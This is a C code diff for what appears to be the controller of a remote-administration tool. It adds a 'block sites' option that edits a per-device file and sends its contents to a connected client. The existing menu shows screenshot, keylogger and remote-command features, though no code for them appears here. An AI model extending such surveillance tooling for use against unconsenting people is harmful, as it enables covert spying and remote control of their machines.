@@ -79,6 +79,7 @@ void *userManagement(int clientNr)
         printf("\t\t->  take screenshot; press s\n");
         printf("\t\t->  stop/start keylog; press k\n");
         printf("\t\t->  enter cmd; press c\n");
+        printf("\t\t->  block sites; press b\n");
         printf("\t\texit press q\n");
 
         fd_set read_fds;
@@ -101,6 +102,81 @@ void *userManagement(int clientNr)
                 encapsulateMessage(&scr_msg, BUF, 'S');
                 sendMessage(clientSock, &scr_msg);
                 break;
+            case 'b': {
+                char filename[BUFFER_SIZE];
+                snprintf(filename, sizeof(filename), "tudor/%s_editor.txt", numeDevice); // File specific to the client
+
+                // Open or create the file
+                int fd = open(filename, O_CREAT | O_RDWR, 0664);
+                if (fd < 0) {
+                    perror("Failed to open/create file");
+                    break;
+                }
+
+                // Load existing content into a buffer
+                char fileBuffer[SEND_BUFFER_SIZE] = {0};
+                read(fd, fileBuffer, sizeof(fileBuffer) - 1);
+
+                // Enable raw mode for custom key handling
+                initTerminal();
+
+                printf("\n--- Editing File: %s ---\n", filename);
+                printf("Press , to save and quit.\n\n");
+                printf("%s", fileBuffer); // Display current content
+
+                size_t cursor = strlen(fileBuffer);
+                char ch;
+
+                while (1) {
+                    ch = getchar();
+
+                    if (ch == ',') { // Exit and save
+                        break;
+                    }
+
+                    if (ch == 127 && cursor > 0) { // Backspace
+                        fileBuffer[--cursor] = '\0';
+                        printf("\b \b");
+                    } else if (ch >= 32 && cursor < sizeof(fileBuffer) - 1) { // Printable characters
+                        fileBuffer[cursor++] = ch;
+                        fileBuffer[cursor] = '\0';
+                        putchar(ch);
+                    }
+                }
+
+                // Restore terminal settings
+                system("clear");
+                //fflush(ch);
+                initTerminal();
+
+                // Write updated content back to the file
+                lseek(fd, 0, SEEK_SET);
+                ftruncate(fd, 0); // Clear the file
+                write(fd, fileBuffer, strlen(fileBuffer));
+                close(fd);
+
+                // Extract strings from the file into a buffer
+                char extractedBuffer[SEND_BUFFER_SIZE] = {0};
+                FILE *fp = fopen(filename, "r");
+                if (fp) {
+                    char line[BUFFER_SIZE];
+                    while (fgets(line, sizeof(line), fp)) {
+                        line[strcspn(line, "\n")] = ' '; // Replace newline with space
+                        strncat(extractedBuffer, line, sizeof(extractedBuffer) - strlen(extractedBuffer) - 1);
+                    }
+                    fclose(fp);
+                }
+
+                printf("\nExtracted Strings: %s\n", extractedBuffer);
+
+                // Encapsulate and send the extracted buffer as a message
+                encapsulateMessage(&scr_msg, extractedBuffer, 'B');
+                sendMessage(clientSock, &scr_msg);
+
+                break; // Ensure the terminal is restored and the loop exits cleanly
+            }
+
+
             case 'k':
                 strcpy(BUF, "");
                 encapsulateMessage(&scr_msg, BUF, 'K');
